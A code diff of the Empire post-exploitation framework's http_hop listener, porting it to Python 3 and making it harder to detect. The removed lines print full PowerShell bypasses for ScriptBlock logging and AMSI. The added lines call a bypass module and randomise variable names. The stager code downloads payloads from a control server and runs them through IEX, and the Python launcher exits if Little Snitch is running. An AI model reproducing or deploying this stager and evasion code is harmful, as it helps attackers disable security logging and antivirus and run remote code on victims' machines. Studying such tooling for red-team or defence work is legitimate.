@@ -1,17 +1,19 @@
-import base64
-import random
-import os
-import errno
+from __future__ import print_function
 
+import base64
+import errno
+import os
+import random
+from builtins import object
+from builtins import str
+
+from lib.common import bypasses
 # Empire imports
 from lib.common import helpers
-from lib.common import agents
-from lib.common import encryption
 from lib.common import packets
-from lib.common import messages
 
 
-class Listener:
+class Listener(object):
 
     def __init__(self, mainMenu, params=[]):
 
@@ -60,7 +62,7 @@ class Listener:
             'Port' : {
                 'Description'   :   'Port for the listener.',
                 'Required'      :   True,
-                'Value'         :   80
+                'Value'         :   ''
             },
             'DefaultProfile' : {
                 'Description'   :   'Default communication profile for the agent, extracted from RedirectListener automatically.',
@@ -106,19 +108,19 @@ class Listener:
 
         for key in self.options:
             if self.options[key]['Required'] and (str(self.options[key]['Value']).strip() == ''):
-                print helpers.color("[!] Option \"%s\" is required." % (key))
+                print(helpers.color("[!] Option \"%s\" is required." % (key)))
                 return False
 
         return True
 
 
-    def generate_launcher(self, encode=True, obfuscate=False, obfuscationCommand="", userAgent='default', proxy='default', proxyCreds='default', stagerRetries='0', language=None, safeChecks='', listenerName=None):
+    def generate_launcher(self, encode=True, obfuscate=False, obfuscationCommand="", userAgent='default', proxy='default', proxyCreds='default', stagerRetries='0', language=None, safeChecks='', listenerName=None, scriptLogBypass=True, AMSIBypass=True, AMSIBypass2=False):
         """
         Generate a basic launcher for the specified listener.
         """
 
         if not language:
-            print helpers.color('[!] listeners/http_hop generate_launcher(): no language specified!')
+            print(helpers.color('[!] listeners/http_hop generate_launcher(): no language specified!'))
 
         if listenerName and (listenerName in self.mainMenu.listeners.activeListeners):
 
@@ -137,39 +139,19 @@ class Listener:
                 stager = '$ErrorActionPreference = \"SilentlyContinue\";'
                 if safeChecks.lower() == 'true':
                     stager = helpers.randomize_capitalization("If($PSVersionTable.PSVersion.Major -ge 3){")
-
                     # ScriptBlock Logging bypass
-                    stager += helpers.randomize_capitalization("$GPF=[ref].Assembly.GetType(")
-                    stager += "'System.Management.Automation.Utils'"
-                    stager += helpers.randomize_capitalization(").\"GetFie`ld\"(")
-                    stager += "'cachedGroupPolicySettings','N'+'onPublic,Static'"
-                    stager += helpers.randomize_capitalization(");If($GPF){$GPC=$GPF.GetValue($null);If($GPC")
-                    stager += "['ScriptB'+'lockLogging']"
-                    stager += helpers.randomize_capitalization("){$GPC")
-                    stager += "['ScriptB'+'lockLogging']['EnableScriptB'+'lockLogging']=0;"
-                    stager += helpers.randomize_capitalization("$GPC")
-                    stager += "['ScriptB'+'lockLogging']['EnableScriptBlockInvocationLogging']=0}"
-                    stager += helpers.randomize_capitalization("$val=[Collections.Generic.Dictionary[string,System.Object]]::new();$val.Add")
-                    stager += "('EnableScriptB'+'lockLogging',0);"
-                    stager += helpers.randomize_capitalization("$val.Add")
-                    stager += "('EnableScriptBlockInvocationLogging',0);"
-                    stager += helpers.randomize_capitalization("$GPC")
-                    stager += "['HKEY_LOCAL_MACHINE\Software\Policies\Microsoft\Windows\PowerShell\ScriptB'+'lockLogging']"
-                    stager += helpers.randomize_capitalization("=$val}")
-                    stager += helpers.randomize_capitalization("Else{[ScriptBlock].\"GetFie`ld\"(")
-                    stager += "'signatures','N'+'onPublic,Static'"
-                    stager += helpers.randomize_capitalization(").SetValue($null,(New-Object Collections.Generic.HashSet[string]))}")
-
+                    if scriptLogBypass:
+                        stager += bypasses.scriptBlockLogBypass()
                     # @mattifestation's AMSI bypass
-                    stager += helpers.randomize_capitalization("[Ref].Assembly.GetType(")
-                    stager += "'System.Management.Automation.AmsiUtils'"
-                    stager += helpers.randomize_capitalization(')|?{$_}|%{$_.GetField(')
-                    stager += "'amsiInitFailed','NonPublic,Static'"
-                    stager += helpers.randomize_capitalization(").SetValue($null,$true)};")
+                    if AMSIBypass:
+                        stager += bypasses.AMSIBypass()
+                    # rastamouse AMSI bypass
+                    if AMSIBypass2:
+                        stager += bypasses.AMSIBypass2()
                     stager += "};"
                     stager += helpers.randomize_capitalization("[System.Net.ServicePointManager]::Expect100Continue=0;")
 
-                stager += helpers.randomize_capitalization("$wc=New-Object System.Net.WebClient;")
+                stager += helpers.randomize_capitalization("$"+helpers.generate_random_script_var_name("wc")+"=New-Object System.Net.WebClient;")
 
                 if userAgent.lower() == 'default':
                     userAgent = profile.split('|')[1]
@@ -182,19 +164,19 @@ class Listener:
                 if userAgent.lower() != 'none' or proxy.lower() != 'none':
 
                     if userAgent.lower() != 'none':
-                        stager += helpers.randomize_capitalization('$wc.Headers.Add(')
+                        stager += helpers.randomize_capitalization('$'+helpers.generate_random_script_var_name("wc")+'.Headers.Add(')
                         stager += "'User-Agent',$u);"
 
                     if proxy.lower() != 'none':
                         if proxy.lower() == 'default':
-                            stager += helpers.randomize_capitalization("$wc.Proxy=[System.Net.WebRequest]::DefaultWebProxy;")
+                            stager += helpers.randomize_capitalization("$"+helpers.generate_random_script_var_name("wc")+".Proxy=[System.Net.WebRequest]::DefaultWebProxy;")
                         else:
                             # TODO: implement form for other proxy
                             stager += helpers.randomize_capitalization("$proxy=New-Object Net.WebProxy;")
                             stager += helpers.randomize_capitalization("$proxy.Address = '"+ proxy.lower() +"';")
-                            stager += helpers.randomize_capitalization("$wc.Proxy = $proxy;")
+                            stager += helpers.randomize_capitalization("$"+helpers.generate_random_script_var_name("wc")+".Proxy = $proxy;")
                         if proxyCreds.lower() == "default":
-                            stager += helpers.randomize_capitalization("$wc.Proxy.Credentials = [System.Net.CredentialCache]::DefaultNetworkCredentials;")
+                            stager += helpers.randomize_capitalization("$"+helpers.generate_random_script_var_name("wc")+".Proxy.Credentials = [System.Net.CredentialCache]::DefaultNetworkCredentials;")
                         else:
                             # TODO: implement form for other proxy credentials
                             username = proxyCreds.split(':')[0]
@@ -202,7 +184,7 @@ class Listener:
                             domain = username.split('\\')[0]
                             usr = username.split('\\')[1]
                             stager += "$netcred = New-Object System.Net.NetworkCredential('"+usr+"','"+password+"','"+domain+"');"
-                            stager += helpers.randomize_capitalization("$wc.Proxy.Credentials = $netcred;")
+                            stager += helpers.randomize_capitalization("$"+helpers.generate_random_script_var_name("wc")+".Proxy.Credentials = $netcred;")
 
                 # TODO: reimplement stager retries?
 
@@ -215,14 +197,14 @@ class Listener:
 
                 # prebuild the request routing packet for the launcher
                 routingPacket = packets.build_routing_packet(stagingKey, sessionID='00000000', language='POWERSHELL', meta='STAGE0', additional='None', encData='')
-                b64RoutingPacket = base64.b64encode(routingPacket)
+                b64RoutingPacket = base64.b64encode(routingPacket).decode("UTF-8")
 
                 # add the RC4 packet to a cookie
-                stager += helpers.randomize_capitalization("$wc.Headers.Add(")
+                stager += helpers.randomize_capitalization("$"+helpers.generate_random_script_var_name("wc")+".Headers.Add(")
                 stager += "\"Cookie\",\"session=%s\");" % (b64RoutingPacket)
+                stager += "$ser=%s;$t='%s';$hop='%s';" % (helpers.obfuscate_call_home_address(host), stage0, listenerName)
 
-                stager += "$ser='%s';$t='%s';" % (host, stage0)
-                stager += helpers.randomize_capitalization("$data=$WC.DownloadData($ser+$t);")
+                stager += helpers.randomize_capitalization("$data=$"+helpers.generate_random_script_var_name("wc")+".DownloadData($ser+$t);")
                 stager += helpers.randomize_capitalization("$iv=$data[0..3];$data=$data[4..$data.length];")
 
                 # decode everything and kick it over to IEX to kick off execution
@@ -249,14 +231,13 @@ class Listener:
                     if safeChecks.lower() == 'true':
                         launcherBase += "import re, subprocess;"
                         launcherBase += "cmd = \"ps -ef | grep Little\ Snitch | grep -v grep\"\n"
-                        launcherBase += "ps = subprocess.Popen(cmd, shell=True, stdout=subprocess.PIPE)\n"
-                        launcherBase += "out = ps.stdout.read()\n"
-                        launcherBase += "ps.stdout.close()\n"
+                        launcherBase += "ps = subprocess.Popen(cmd, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)\n"
+                        launcherBase += "out, err = ps.communicate()\n"
                         launcherBase += "if re.search(\"Little Snitch\", out):\n"
                         launcherBase += "   sys.exit()\n"
                 except Exception as e:
                     p = "[!] Error setting LittleSnitch in stagger: " + str(e)
-                    print helpers.color(p, color='red')
+                    print(helpers.color(p, color='red'))
 
                 if userAgent.lower() == 'default':
                     userAgent = profile.split('|')[1]
@@ -267,7 +248,7 @@ class Listener:
 
                 # prebuild the request routing packet for the launcher
                 routingPacket = packets.build_routing_packet(stagingKey, sessionID='00000000', language='PYTHON', meta='STAGE0', additional='None', encData='')
-                b64RoutingPacket = base64.b64encode(routingPacket)
+                b64RoutingPacket = base64.b64encode(routingPacket).decode("UTF-8")
 
                 launcherBase += "import urllib2\n"
 
@@ -294,7 +275,7 @@ class Listener:
 
                 # add the RC4 packet to a cookie
                 launcherBase += "o.addheaders=[('User-Agent',UA), (\"Cookie\", \"session=%s\")];\n" % (b64RoutingPacket)
-                
+
                 #install proxy and creds globally, so they can be used with urlopen.
                 launcherBase += "urllib2.install_opener(o);\n"
 
@@ -318,24 +299,24 @@ class Listener:
                 launcherBase += "exec(''.join(out))"
 
                 if encode:
-                    launchEncoded = base64.b64encode(launcherBase)
-                    launcher = "echo \"import sys,base64;exec(base64.b64decode('%s'));\" | /usr/bin/python &" % (launchEncoded)
+                    launchEncoded = base64.b64encode(launcherBase).decode("UTF-8")
+                    launcher = "echo \"import sys,base64;exec(base64.b64decode('%s'));\" | python3 &" % (launchEncoded)
                     return launcher
                 else:
                     return launcherBase
 
             else:
-                print helpers.color("[!] listeners/http_hop generate_launcher(): invalid language specification: only 'powershell' and 'python' are current supported for this module.")
+                print(helpers.color("[!] listeners/http_hop generate_launcher(): invalid language specification: only 'powershell' and 'python' are current supported for this module."))
 
         else:
-            print helpers.color("[!] listeners/http_hop generate_launcher(): invalid listener name specification!")
+            print(helpers.color("[!] listeners/http_hop generate_launcher(): invalid listener name specification!"))
 
     def generate_stager(self, listenerOptions, encode=False, encrypt=True, obfuscate=False, obfuscationCommand="", language=None):
         """
         If you want to support staging for the listener module, generate_stager must be
         implemented to return the stage1 key-negotiation stager code.
         """
-        print helpers.color("[!] generate_stager() not implemented for listeners/http_hop")
+        print(helpers.color("[!] generate_stager() not implemented for listeners/http_hop"))
         return ''
 
 
@@ -344,7 +325,7 @@ class Listener:
         If you want to support staging for the listener module, generate_agent must be
         implemented to return the actual staged agent code.
         """
-        print helpers.color("[!] generate_agent() not implemented for listeners/http_hop")
+        print(helpers.color("[!] generate_agent() not implemented for listeners/http_hop"))
         return ''
 
 
@@ -374,18 +355,18 @@ class Listener:
                                 $RoutingCookie = [Convert]::ToBase64String($RoutingPacket)
 
                                 # build the web request object
-                                $wc = New-Object System.Net.WebClient
+                                $"""+helpers.generate_random_script_var_name("wc")+""" = New-Object System.Net.WebClient
 
                                 # set the proxy settings for the WC to be the default system settings
-                                $wc.Proxy = [System.Net.WebRequest]::GetSystemWebProxy();
-                                $wc.Proxy.Credentials = [System.Net.CredentialCache]::DefaultCredentials;
-                                $wc.Headers.Add("User-Agent",$script:UserAgent)
-                                $script:Headers.GetEnumerator() | % {$wc.Headers.Add($_.Name, $_.Value)}
-                                $wc.Headers.Add("Cookie", "session=$RoutingCookie")
+                                $"""+helpers.generate_random_script_var_name("wc")+""".Proxy = [System.Net.WebRequest]::GetSystemWebProxy();
+                                $"""+helpers.generate_random_script_var_name("wc")+""".Proxy.Credentials = [System.Net.CredentialCache]::DefaultCredentials;
+                                $"""+helpers.generate_random_script_var_name("wc")+""".Headers.Add("User-Agent",$script:UserAgent)
+                                $script:Headers.GetEnumerator() | % {$"""+helpers.generate_random_script_var_name("wc")+""".Headers.Add($_.Name, $_.Value)}
+                                $"""+helpers.generate_random_script_var_name("wc")+""".Headers.Add("Cookie", "session=$RoutingCookie")
 
                                 # choose a random valid URI for checkin
                                 $taskURI = $script:TaskURIs | Get-Random
-                                $result = $wc.DownloadData($Script:ControlServers[$Script:ServerIndex] + $taskURI)
+                                $result = $"""+helpers.generate_random_script_var_name("wc")+""".DownloadData($Script:ControlServers[$Script:ServerIndex] + $taskURI)
                                 $result
                             }
                         }
@@ -413,17 +394,17 @@ class Listener:
 
                             if($Script:ControlServers[$Script:ServerIndex].StartsWith('http')) {
                                 # build the web request object
-                                $wc = New-Object System.Net.WebClient
+                                $"""+helpers.generate_random_script_var_name("wc")+""" = New-Object System.Net.WebClient
                                 # set the proxy settings for the WC to be the default system settings
-                                $wc.Proxy = [System.Net.WebRequest]::GetSystemWebProxy();
-                                $wc.Proxy.Credentials = [System.Net.CredentialCache]::DefaultCredentials;
-                                $wc.Headers.Add('User-Agent', $Script:UserAgent)
-                                $Script:Headers.GetEnumerator() | ForEach-Object {$wc.Headers.Add($_.Name, $_.Value)}
+                                $"""+helpers.generate_random_script_var_name("wc")+""".Proxy = [System.Net.WebRequest]::GetSystemWebProxy();
+                                $"""+helpers.generate_random_script_var_name("wc")+""".Proxy.Credentials = [System.Net.CredentialCache]::DefaultCredentials;
+                                $"""+helpers.generate_random_script_var_name("wc")+""".Headers.Add('User-Agent', $Script:UserAgent)
+                                $Script:Headers.GetEnumerator() | ForEach-Object {$"""+helpers.generate_random_script_var_name("wc")+""".Headers.Add($_.Name, $_.Value)}
 
                                 try{
                                     # get a random posting URI
                                     $taskURI = $Script:TaskURIs | Get-Random
-                                    $response = $wc.UploadData($Script:ControlServers[$Script:ServerIndex]+$taskURI, 'POST', $RoutingPacket);
+                                    $response = $"""+helpers.generate_random_script_var_name("wc")+""".UploadData($Script:ControlServers[$Script:ServerIndex]+$taskURI, 'POST', $RoutingPacket);
                                 }
                                 catch [System.Net.WebException]{
                                     # exception posting data...
@@ -492,9 +473,9 @@ def send_message(packets=None):
                 return updateServers + sendMessage
 
             else:
-                print helpers.color("[!] listeners/http_hop generate_comms(): invalid language specification, only 'powershell' and 'python' are current supported for this module.")
+                print(helpers.color("[!] listeners/http_hop generate_comms(): invalid language specification, only 'powershell' and 'python' are current supported for this module."))
         else:
-            print helpers.color('[!] listeners/http_hop generate_comms(): no language specified!')
+            print(helpers.color('[!] listeners/http_hop generate_comms(): no language specified!'))
 
 
     def start(self, name=''):
@@ -536,12 +517,12 @@ def send_message(packets=None):
 
                 with open(saveName, 'w') as f:
                     f.write(hopCode)
-                    print helpers.color("[*] Hop redirector written to %s . Place this file on the redirect server." % (saveName))
+                    print(helpers.color("[*] Hop redirector written to %s . Place this file on the redirect server." % (saveName)))
 
             return True
 
         else:
-            print helpers.color("[!] Redirect listener name %s not a valid listener!" % (redirectListenerName))
+            print(helpers.color("[!] Redirect listener name %s not a valid listener!" % (redirectListenerName)))
             return False
 
 
